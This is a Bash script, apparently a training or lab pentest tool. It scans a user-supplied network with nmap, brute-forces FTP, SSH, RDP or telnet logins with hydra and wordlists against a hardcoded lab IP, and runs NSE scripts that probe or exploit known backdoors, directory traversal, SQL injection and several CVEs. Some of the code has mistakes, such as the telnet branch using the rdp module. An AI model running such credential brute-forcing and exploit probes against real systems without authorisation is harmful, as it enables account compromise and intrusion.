#!/bin/bash


#function to enter network and directory to save results

function network()
{
	
	read -p "Enter a network to scan: " network																	# get from user network to scan
	echo
	echo "	You have entered $network"																			# display network received
				
	echo
	read -p "Enter a name for the output directory: " dir														# get from user name of output directory
	mkdir -p $dir																								# create directory. p flag prevents errors if dir already exists
	pwd=$(pwd)																									# find file path
	output_dir="$pwd/$dir"																						# obtain absolute file path of new dir
	echo
	echo "	Files for this scan will be saved in $output_dir"													# display absolute file path of new dir
	echo
	
}

# function to scan nmap, extract running services, find login services, bruteforce to find weak passwords

function tcpenum()
{
		
	echo "Now scanning TCP ports on $network using nmap..."
	
	nmap $network -sV -p- -oN $(date +"%Y%m%d")nmapnorm.on > $output_dir/$(date +"%Y%m%d")nmapnorm.on			# nmap scan incl service version, all ports, save as normal output 

	echo	
	
	logftp=$(cat $output_dir/$(date +"%Y%m%d")nmapnorm.on | grep open | grep ftp | wc -l)						# extract open ports running ftp service
	logssh=$(cat $output_dir/$(date +"%Y%m%d")nmapnorm.on | grep open | grep ssh | wc -l)						# extract open ports running ssh service
	logrdp=$(cat $output_dir/$(date +"%Y%m%d")nmapnorm.on | grep open | grep rdp | wc -l)						# extract open ports running rdp service
	logtelnet=$(cat $output_dir/$(date +"%Y%m%d")nmapnorm.on | grep open | grep telnet | wc -l)					# extract open ports running telnet service
	
	sum=$((logftp+logssh+logrdp+logtelnet))																		# check if any of login services are running
		
	if [ $sum -ge 1 ]																							# check if at least one login service is running
	then
		echo "Login services found!"
	else
		echo "No login services found!"																			# inform if no login service is running
	fi

	echo
	
	
	if [ $logftp -ge 1 ]																						# check if ftp service is running - 1st choice
	then
		
		echo 'Would you like to upload lists of usernames and passwords to bruteforce or use default?'			# give user option to upload own username+password lists
		read -p "(U)pload or (D)efault: " upfile																# get user input for option
		echo
		
		sleep 1

	
		case $upfile in				
			U|u)
			
				read -p 'Enter file path of usernames list: ' upuserlist										# get user input for file path of usernames list
				read -p 'Enter file path of passwords list: ' uppwlist											# get user input for file path of passwords list
				echo
				
				if [ ! -f "$upuserlist" ]																		# check if file exist
				then
					echo "File not found: $upuserlist"															# inform file does not exist
					echo "Using default usernames list..."														# inform will use default list
					userlist=top-usernames-shortlist.txt														# use default list
					
				else
					userlist=$upuserlist																		# if file exist, will be used
					echo "Using $upuserlist..."																	# display file to be used
					
				fi
				
				echo
				
				if [ ! -f "$uppwlist" ]																			# check if file exist
				then
					echo "File not found: $uppwlist"															# inform file does not exist
					echo "Using default passwords list..."														# inform will use default list
					pwlist=top-passwords-shortlist.txt															# use default list
					
				else
					pwlist=$uppwlist																			# if file exist, will be used
					echo "Using $uppwlist..."																	# display file to be used
					
				fi
				
				echo
				
			;;
			D|d)
				
				echo "Using default usernames and passwords lists..."											# inform using default lists
				userlist=top-usernames-shortlist.txt
				pwlist=top-passwords-shortlist.txt
				echo
			
			;;
	esac
		
		sleep 1

			
		if [ $logftp -ge 1 ]																														# check if ftp service is running (1st choice)
		then
			echo 'Bruteforcing through ftp now...'																									# inform using ftp to bruteforce
			
			hydra -L $userlist -P $pwlist 192.168.80.131 ftp > "$output_dir"/$(date +"%Y%m%d")ftpcredential.txt										# using hydra to bruteforce and saving results in dir
			echo
		
			cred=$(cat "$output_dir"/$(date +"%Y%m%d")ftpcredential.txt | grep -i host | grep -i login | grep -i password | wc -l)					# check if any passwords found
		
			if [ $cred -ge 1 ]																														# if any passwords found,
			then
				echo 'Login credentials found'																										# inform
				echo
				cat "$output_dir"/$(date +"%Y%m%d")ftpcredential.txt | grep -i host | grep -i login | grep -i password | awk '{print $(NF-5), $(NF-4), $(NF-3), $(NF-2), $(NF-1), $(NF)}'		# display credentials found
		
			fi
					
		elif [ $logssh -ge 1 ]																														# check if ssh service is running (2nd choice)
		then
			echo 'Bruteforcing through ssh now...'																									# inform using ssh to bruteforce
			hydra -t 4 192.168.80.131 -L $userlist -P $pwlist ssh > "$output_dir"/$(date +"%Y%m%d")sshcredential.txt								# using hydra to bruteforce and saving results in dir
			echo
			
			cred=$(cat "$output_dir"/$(date +"%Y%m%d")sshcredential.txt | grep -i host | grep -i login | grep -i password | wc -l)					# check if any passwords found
		
			if [ $cred -ge 1 ]																														# if any passwords found,
			then
				echo 'Login credentials found'																										# inform
				echo
				cat "$output_dir"/$(date +"%Y%m%d")sshcredential.txt | grep -i host | grep -i login | grep -i password | awk '{print $(NF-5), $(NF-4), $(NF-3), $(NF-2), $(NF-1), $(NF)}'		# display credentials found
		
			fi
			
		elif [ $logrdp -ge 1 ]																														# check if rdp service is running (3rd choice)
		then
			echo 'Bruteforcing through rdp now...'																									# inform using rdp to bruteforce
			hydra 192.168.80.131 -L $userlist -P $pwlist rdp > "$output_dir"/$(date +"%Y%m%d")rdpcredential.txt										# using hydra to bruteforce and saving results in dir
			echo
			
			cred=$(cat "$output_dir"/$(date +"%Y%m%d")rdpcredential.txt | grep -i host | grep -i login | grep -i password | wc -l)					# check if any passwords found
		
			if [ $cred -ge 1 ]																														# if any passwords found,
			then
				echo 'Login credentials found'																										# inform
				echo
				cat "$output_dir"/$(date +"%Y%m%d")rdpcredential.txt | grep -i host | grep -i login | grep -i password | awk '{print $(NF-5), $(NF-4), $(NF-3), $(NF-2), $(NF-1), $(NF)}'		# display credentials found
				
			fi
			
		elif [ $logtelnet -ge 1 ]																													# check if telnet service is running (4th choice)
		then
			echo 'Bruteforcing through telnet now...'																								# inform using telnet to bruteforce
			hydra 192.168.80.131 -L $userlist -P $pwlist rdp > "$output_dir"/$(date +"%Y%m%d")telnetcredential.txt									# using hydra to bruteforce and saving results in dir
			echo
			
			cred=$(cat "$output_dir"/$(date +"%Y%m%d")telnetcredential.txt | grep -i host | grep -i login | grep -i password | wc -l)				# check if any passwords found
		
			if [ $cred -ge 1 ]																														# if any passwords found,
			then
				echo 'Login credentials found!'																										# inform
				echo
				cat "$output_dir"/$(date +"%Y%m%d")telnetcredential.txt | grep -i host | grep -i login | grep -i password | awk '{print $(NF-5), $(NF-4), $(NF-3), $(NF-2), $(NF-1), $(NF)}'		# display credentials found
				echo
			else
			echo 'No login credentials found'																										# inform if no passwords found
			echo	
			fi				
		fi	
	fi
	
}


#function to scan vulns using nse	

function vulnscan()
{
	
	echo 'Mapping vulnerabilities using NSE...'
	echo
	echo 'Updating Nmap scripts...'
	sudo nmap --script-updatedb																								# update scripts' db
	echo
	
	logftp=$(cat "$output_dir"/$(date +"%Y%m%d")nmapnorm.on | grep open | grep ftp | wc -l)									# concentrating on services accessible to internet traffic - ftp, http, smtp, dns
	loghttp=$(cat "$output_dir"/$(date +"%Y%m%d")nmapnorm.on | grep open | grep http | wc -l)
	logsmtp=$(cat "$output_dir"/$(date +"%Y%m%d")nmapnorm.on | grep open | grep smtp | wc -l)
	logdns=$(cat "$output_dir"/$(date +"%Y%m%d")nmapnorm.on | grep open | grep dns | wc -l)
	
	
	if [ $logftp -ge 1 ]																									# check if ftp service is running 
	then
		
		echo 'Running nmap script ftp-proftpd-backdoor...'		
		nmap --script ftp-proftpd-backdoor $network > $output_dir/$(date +"%Y%m%d")ftp-proftpd-backdoor.txt					# Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID 45150. This script attempts to exploit the backdoor using the innocuous id command by default, but that can be changed with the ftp-proftpd-backdoor.cmd script argument.
		echo
		echo 'Running nmap script ftp-vsftpd-backdoor...'	
		nmap --script ftp-vsftpd-backdoor $network > $output_dir/$(date +"%Y%m%d")ftp-vsftpd-backdoor.txt					# TTests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04 (CVE-2011-2523). This script attempts to exploit the backdoor using the innocuous id command by default, but that can be changed with the exploit.cmd or ftp-vsftpd-backdoor.cmd script arguments.
		echo
			
	fi
	
		sleep 1
		
	if [ $loghttp -ge 1 ]																									# check if http service is running
	then
		
		echo 'Running nmap script http-enum...'		
		nmap --script http-enum $network > $output_dir/$(date +"%Y%m%d")http-enum.txt										# Enumerates directories used by popular web applications and servers
		echo
		echo 'Running nmap script http-passwd...'	
		nmap --script http-passwd $network > $output_dir/$(date +"%Y%m%d")http-passwd.txt									# Checks if a web server is vulnerable to directory traversal by attempting to retrieve /etc/passwd or \boot.ini
		echo
		echo 'Running nmap script http-sql-injection...'	
		nmap --script http-sql-injection $network > $output_dir/$(date +"%Y%m%d")http-sql-injection.txt						# Spiders an HTTP server looking for URLs containing queries vulnerable to an SQL injection attack. It also extracts forms from found websites and tries to identify fields that are vulnerable.
		echo
		echo 'Running nmap script http-vuln-cve2015-1635...'
		nmap --script http-vuln-cve2015-1635 $network > $output_dir/$(date +"%Y%m%d")http-vuln-cve2015-1635.txt				# Checks for a remote code execution vulnerability (MS15-034) in Microsoft Windows systems (CVE2015-2015-1635)
		echo
		echo 'Running nmap script http-vuln-cve2017-1001000...'
		nmap --script http-vuln-cve2017-1001000 $network > $output_dir/$(date +"%Y%m%d")http-vuln-cve2017-1001000.txt		# Attempts to detect a privilege escalation vulnerability in Wordpress 4.7.0 and 4.7.1 that allows unauthenticated users to inject content in posts.
		echo
							
	fi
	
		sleep 1
	
	if [ $logsmtp -ge 1 ]																									# check if smtp service is running
	then
		
		echo 'Running nmap script smtp-vuln-cve2010-4344...'		
		nmap --script smtp-vuln-cve2010-4344 $network > $output_dir/$(date +"%Y%m%d")smtp-vuln-cve2010-4344.txt				# Checks for and/or exploits a heap overflow within versions of Exim prior to version 4.69 (CVE-2010-4344) and a privilege escalation vulnerability in Exim 4.72 and prior (CVE-2010-4345)
		echo
		echo 'Running nmap script smtp-vuln-cve2011-1720...'	
		nmap --script smtp-vuln-cve2011-1720 $network > $output_dir/$(date +"%Y%m%d")smtp-vuln-cve2011-1720.txt				# This vulnerability can allow denial of service and possibly remote code execution
		echo
		echo 'Running nmap script smtp-vuln-cve2011-1764...'	
		nmap --script smtp-vuln-cve2011-1764 $network > $output_dir/$(date +"%Y%m%d")smtp-vuln-cve2011-1764.txt				# A remote attacker who is able to send emails, can exploit this vulnerability and execute arbitrary code with the privileges of the Exim daemon.
			
	fi
	
	sleep 1
	
	if [ $logdns -ge 1 ]																									# check if dns service is running
	then
		
		echo 'Running nmap script dns-brute...'		
		nmap --script dns-brute $network > $output_dir/$(date +"%Y%m%d")dns-brute.txt										# Attempts to enumerate DNS hostnames by brute force guessing of common subdomains
		echo
		echo 'Running nmap script dns-srv-enum...'	
		nmap --script dns-srv-enum $network > $output_dir/$(date +"%Y%m%d")dns-srv-enum.txt									# Enumerates various common service (SRV) records
			
	fi
	
	sleep 1

	echo	
	echo "	All results saved in $output_dir"																				# inform where results are saved at
	echo

}


# function to check what results were saved and aftermath

function results()
{
	
	echo -e "Files of results in $output_dir:"																# inform what results are available

	if [ -f $output_dir/$(date +"%Y%m%d")nmapnorm.on ]														# check if each scan has a saved file
	then
		echo "	Nmap scan | $(date +"%Y%m%d")nmapnorm.on"													# if exist, display title and file name
	fi
				
	if [ -f $output_dir/$(date +"%Y%m%d")ftpcredential.txt ]
	then
		echo "	Credentials from ftp bruteforce | $(date +"%Y%m%d")ftpcredential.txt"				
	fi				

	if [ -f $output_dir/$(date +"%Y%m%d")sshcredential.txt ]
	then
		echo "	Credentials from ssh bruteforce | $(date +"%Y%m%d")sshcredential.txt"				
	fi				
				
	if [ -f $output_dir/$(date +"%Y%m%d")rdpcredential.txt ]
	then
		echo "	Credentials from rdp bruteforce | $(date +"%Y%m%d")rdpcredential.txt"				
	fi
				
	if [ -f $output_dir/$(date +"%Y%m%d")telnetcredential.txt ]
	then
		echo "	Credentials from ftp bruteforce | $(date +"%Y%m%d")telnetcredential.txt"				
	fi
			
	if [ -f $output_dir/$(date +"%Y%m%d")ftp-proftpd-backdoor.txt ]
	then
		echo "	Results of NSE ftp scan | $(date +"%Y%m%d")ftp-proftpd-backdoor.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")ftp-vsftpd-backdoor.txt ]
	then
		echo "	Results of NSE ftp scan | $(date +"%Y%m%d")ftp-vsftpd-backdoor.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")http-enum.txt ]
	then
		echo "	Results of NSE http scan | $(date +"%Y%m%d")http-enum.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")http-passwd.txt ]
	then
		echo "	Results of NSE http scan | $(date +"%Y%m%d")http-passwd.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")http-sql-injection.txt ]
	then
		echo "	Results of NSE http scan | $(date +"%Y%m%d")http-sql-injection.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")http-vuln-cve2015-1635.txt ]
	then
		echo "	Results of NSE http scan | $(date +"%Y%m%d")http-vuln-cve2015-1635.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")http-vuln-cve2017-1001000.txt ]
	then
		echo "	Results of NSE http scan | $(date +"%Y%m%d")http-vuln-cve2017-1001000.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")smtp-vuln-cve2010-4344.txt ]
	then
		echo "	Results of NSE smtp scan | $(date +"%Y%m%d")smtp-vuln-cve2010-4344.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")smtp-vuln-cve2011-1720.txt ]
	then
		echo "	Results of NSE smtp scan | $(date +"%Y%m%d")smtp-vuln-cve2011-1720.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")smtp-vuln-cve2011-1764.txt ]
	then
		echo "	Results of NSE smtp scan | $(date +"%Y%m%d")smtp-vuln-cve2011-1764.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")dns-brute.txt ]
	then
		echo "	Results of NSE dns scan | $(date +"%Y%m%d")dns-brute.txt"				
	fi		
				
	if [ -f $output_dir/$(date +"%Y%m%d")dns-srv-enum.txt ]
	then
		echo "	Results of NSE dns scan | $(date +"%Y%m%d")dns-srv-enum.txt"				
	fi				

	echo
	read -p "Would you like to search inside the results? (Y)es/(N)o: " search								# get user choice of whether to open files

	case $search in
		Y|y)
			echo
			echo '	Now opening all files using geany...'		
			sleep 1
			for file in $output_dir/*;																		# open all files in dir using geany
			do
				geany "$file"
			done
		;;
		
		N|n)
			
	esac

	echo
	read -p "Would you like to zip it? (Y)es/(N)o: " zip													# get user choice of whether to zip dir

	case $zip in
		Y|y)
			zip -r -j -q $(date +"%Y%m%d")$dir.zip $output_dir												# zip all files in directory recursively without paths in quiet operation
			echo
			echo "	Directory zipped to $(date +"%Y%m%d")$dir.zip"											# display name of zip file

		;;
		N|n)
			
		;;
		
	esac
	echo

}
	

# starting point: choose scan

function mainmenu()
{
	read -p "Enter (B) for a Basic Scan, (F) for a FUll Scan, or (X) to Exit: " scan				# get user choice of basic or full scan
	
	case $scan in
		B|b)																						# choice of basic scan
			echo
			echo '	You have selected Basic Scan'						
			echo
			network																					# user to input network
			echo
			tcpenum																					# run nmap scan, check for weak passwords
			echo
			results																					# collate results
							
		;;
		F|f)																						# choice of full scan
			echo
			echo '	You have selected Full Scan'
			echo
			network																					# user to input network
			echo
			tcpenum 																				# run nmap scan, check for weak passwords
			echo
			vulnscan																				# run nse scripts, check for vulns
			echo
			results																					# collate results

		;;
		X|x)
			echo
			echo 																																																						"	What's that behind you?"
																																																										sleep 2
			exit
			
		;;
	esac
	
	mainmenu
	
	
}

mainmenu
















#meow

